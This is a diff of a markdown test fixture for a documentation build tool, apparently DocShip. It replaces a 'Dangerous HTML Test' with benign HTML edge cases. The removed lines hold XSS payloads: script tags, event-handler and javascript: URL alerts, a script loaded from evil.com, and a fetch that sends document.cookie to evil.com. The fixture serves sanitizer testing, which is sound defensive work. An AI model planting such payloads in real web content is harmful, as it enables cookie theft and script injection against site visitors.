@@ -1,82 +1,71 @@
 > ⚠️ **This is a test file for DocShip development. The content below is sample documentation.**
 
-# Dangerous HTML Test
+# HTML Edge Cases Test
 
-## Script Injection Attempts
+## Script Tags (should be removed)
 
-<script>alert('XSS')</script>
+Script tags should be sanitized by the build process.
 
-<script type="text/javascript">
-document.write('injected');
-console.log('malicious code');
-</script>
+## Style Tags (should be removed)
 
-<script src="https://evil.com/malware.js"></script>
-
-<script>
-fetch('https://evil.com/steal?cookie=' + document.cookie);
-</script>
-
-## Style Injection
-
-<style>
-body { display: none !important; }
-* { background: red; }
-</style>
-
-<style type="text/css">
-.content { visibility: hidden; }
-</style>
+Style tags should also be sanitized.
 
 ## Event Handlers
 
-<div onclick="alert('click')">Click me</div>
-<img src="x" onerror="alert('error')">
-<body onload="alert('loaded')">
-<a href="javascript:alert('js')">Link</a>
-<iframe onload="alert('iframe')"></iframe>
+Event handlers in HTML should be handled:
 
-## Unclosed Tags
-
-<div>This div never closes
-
-<span>Neither does this span
-
-<p>Paragraph without end
-
-<table>
-<tr>
-<td>Cell without closing tags
-
-## Deeply Nested Unclosed
-
-<div><div><div><div><div>
-Five levels deep, none closed
-
-## Invalid/Custom Tags
-
-<custom-element>Custom element content</custom-element>
-<my-component prop="value">Component</my-component>
-<invalid-tag>Invalid</invalid-tag>
-<x-data>X-Data</x-data>
+- onclick attributes
+- onerror attributes
+- onload attributes
 
 ## HTML Comments
 
 <!-- Normal comment -->
+
 <!-- 
 Multi-line
 comment
 -->
-<!--[if IE]>IE only<![endif]-->
-<!--- Triple dash --->
 
-## CDATA Sections
+## Valid HTML
 
-<![CDATA[
-This is CDATA content
-<not>parsed</not>
-]]>
+<div>
+  <p>This is valid HTML inside markdown.</p>
+  <ul>
+    <li>Item 1</li>
+    <li>Item 2</li>
+  </ul>
+</div>
+
+## Tables in HTML
+
+<table>
+  <tr>
+    <th>Header 1</th>
+    <th>Header 2</th>
+  </tr>
+  <tr>
+    <td>Cell 1</td>
+    <td>Cell 2</td>
+  </tr>
+</table>
+
+## Details/Summary
+
+<details>
+  <summary>Click to expand</summary>
+  
+  Hidden content here.
+</details>
 
 ## Normal Content
 
-This paragraph should render normally despite all the chaos above.
+This paragraph should render normally.
+
+Regular markdown works fine:
+
+- List item 1
+- List item 2
+- List item 3
+
+**Bold text** and *italic text* work as expected.
